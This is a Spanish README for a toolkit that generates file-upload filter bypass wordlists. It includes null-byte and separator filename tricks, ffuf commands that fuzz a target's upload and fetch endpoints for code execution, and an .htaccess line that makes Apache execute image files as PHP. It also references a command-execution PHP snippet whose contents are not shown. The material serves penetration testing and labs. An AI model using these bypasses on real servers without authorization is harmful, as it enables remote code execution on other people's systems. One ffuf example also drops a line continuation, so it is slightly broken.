# fileUpload dictionary toolkit

Toolkit pequeño para **crear diccionarios de file upload**.

La herramienta solo organiza fuentes y genera listas reutilizables para pruebas de upload:

## Estructura

```text
/opt/fileUpload/
├── bin/
│   ├── gen_filename_wordlist.sh
│   ├── gen_get_candidates.py
│   ├── build_extension_wordlist.sh
│   ├── setup_symlinks.sh
│   ├── clean_results.sh
│   └── install.sh
├── wordlists/
│   ├── custom/
│   │   ├── php_exts.txt
│   │   ├── asp_exts.txt
│   │   ├── jsp_exts.txt
│   │   ├── allowed_image_exts.txt
│   │   ├── upload_common_mime.txt
│   │   └── upload_fieldnames.txt
│   ├── external/
│   │   ├── seclists-*.txt
│   │   └── payloadsallthethings/
│   ├── generated/
│   └── content/
│       ├── php/
│       ├── aspnet/
│       ├── jsp/
│       ├── ssi/
│       ├── node/
│       └── magic_numbers/
├── requests/
├── results/
└── examples/
```

## Instalación

Desde el repo clonado:

```bash
sudo ./bin/install.sh /opt/fileUpload
cd /opt/fileUpload
```

Crear symlinks a SecLists si está instalado:

```bash
bin/setup_symlinks.sh
```



---

# 1. Generar filenames evasivos

Script principal:

```bash
bin/gen_filename_wordlist.sh [dangerous_exts_file] [output_file] [allowed_exts_file]
```

Argumentos:

| Argumento | Descripción | Default |
|---|---|---|
| `dangerous_exts_file` | extensiones peligrosas o interesantes | `wordlists/custom/php_exts.txt` |
| `output_file` | archivo generado | `wordlists/generated/evasive_filenames.txt` |
| `allowed_exts_file` | extensiones permitidas por la app | `wordlists/custom/allowed_image_exts.txt` |

La idea es combinar:

```text
extensión peligrosa + separadores + extensión permitida
extensión permitida + separadores + extensión peligrosa
```

Ejemplos de separadores usados:

```text
%20
%09
%0a
%00
%0d%0a
/
.\
.
..
...
…
:
```

## 1.1 Perfil por defecto: PHP contra whitelist de imágenes

Usa PHP como extensiones peligrosas y `.jpg`, `.jpeg`, `.png`, `.gif` como extensiones permitidas.

```bash
cd /opt/fileUpload

bin/gen_filename_wordlist.sh \
  wordlists/custom/php_exts.txt \
  wordlists/generated/php_image_evasive.txt
```

Salida:

```text
wordlists/generated/php_image_evasive.txt
```

## 1.2 Whitelist personalizada

Si la aplicación solo permite `.jpg`:

```bash
printf '.jpg\n' > wordlists/generated/allowed_jpg_only.txt

bin/gen_filename_wordlist.sh \
  wordlists/custom/php_exts.txt \
  wordlists/generated/php_jpg_only.txt \
  wordlists/generated/allowed_jpg_only.txt
```

---


## Ejemplo de uso con ffuf - con `upload.req`

Tras generar  el diccionario `php_image_evasive.txt`, podemos guardar la petición como `upload.req` y añadir FUZZ en el lugar correcto en la petición y fuzzear del siguiente modo

```bash
# Ajustar el filtro según convenga
ffuf \
  -request upload.req \
  -request-proto http \
  -w /opt/fileUpload/wordlists/generated/php_image_evasive.txt \
  -mr 'File successfully uploaded'
  -of json \
  -o /opt/fileUpload/results/upload_acceptance.json
```

Obteniendo una lista de resultados válidos como sigue: 

```bash
jq -r '.results[].input.FUZZ' /opt/fileUpload/results/upload_acceptance.json \
  > /opt/fileUpload/results/accepted_filenames.txt
```

# 2. Convertir filenames aceptados en candidatos GET

Script:

```bash
bin/gen_get_candidates.py accepted_filenames.txt > candidates_get.txt
```

## Por qué existe

En file upload, el nombre que el servidor acepta durante el upload no siempre coincide con el nombre que se debe pedir después por URL.

Ejemplo:

```text
filename aceptado: shell.jpg%00.phar
```

Si el backend lo guarda literalmente como los caracteres `%`, `0`, `0`, entonces para pedirlo por URL necesitas codificar el `%` como `%25`. Este script contempla varias formas de cómo se puede guardar el archivo en el backend. Podemos hacer fuzzing con `candidates_get.txt` como sigue: 

```bash
# Ajustar el filtro según convenga. En este caso se supone que como payload se ha utilizado ./wordlists/content/php/php_funciona.php
ffuf \
  -w /opt/fileUpload/results/candidates_get.txt \
  -u "http://$target/profile_images/FUZZ" \
  -mr 'php_funciona' \
  -mc all \
  -raw \
  -of json \
  -o /opt/fileUpload/results/get_rce.json
```

Ejemplos:

| Filename aceptado | Candidato GET |
|---|---|
| `shell.jpg%00.phar` | `shell.jpg%2500.phar` |
| `shell.phar%0a.jpg` | `shell.phar%250a.jpg` |
| `shell%2ephp.jpg` | `shell%252ephp.jpg` |



# 3. MIME types

No hay script específico para generar MIME types. La herramienta deja dos fuentes listas para usar:

```text
wordlists/custom/upload_common_mime.txt
wordlists/external/seclists-all-content-types.txt
```


# 4. Contenido manual para archivos

En vez de generar archivos de contenido mediante script, el toolkit incluye snippets en:

```text
wordlists/content/
```

La idea es que copies manualmente el contenido que necesites y lo combines con tu propio archivo, extensión o magic bytes.

---

## 4.1 PHP

```text
wordlists/content/php/
├── php_funciona.php
├── php_introspection.php
├── phpinfo_marker.php
├── php_cmd_get.php
└── htaccess_enable_php_for_images.htaccess
```

 `php_funciona.php` imprime: `php_funciona` mediante `<?php echo base64_decode("cGhwX2Z1bmNpb25h"); ?>`



`htaccess_enable_php_for_images.htaccess` es un Snippet para laboratorios Apache donde se pueda subir `.htaccess`: `AddType application/x-httpd-php .jpg .jpeg .png .gif`

---

## 4.2 Otros lenguajes / handlers

```text
wordlists/content/aspnet/aspx_funciona.aspx
wordlists/content/jsp/jsp_funciona.jsp
wordlists/content/ssi/shtml_funciona.shtml
wordlists/content/node/ejs_funciona.ejs
```



# 5. Magic numbers / formatos

Magic numbers y firmas copiables:

```text
wordlists/content/magic_numbers/
├── common_magic_numbers.md
├── gif.txt
├── jpeg.hex
├── png.hex
├── pdf.txt
└── zip.hex
```

Estos ficheros no son payloads completos. Son referencias para copiar o prefijar contenido manualmente.

---



# 6. Limpieza

Eliminar resultados y wordlists generadas:

```bash
bin/clean_results.sh
```

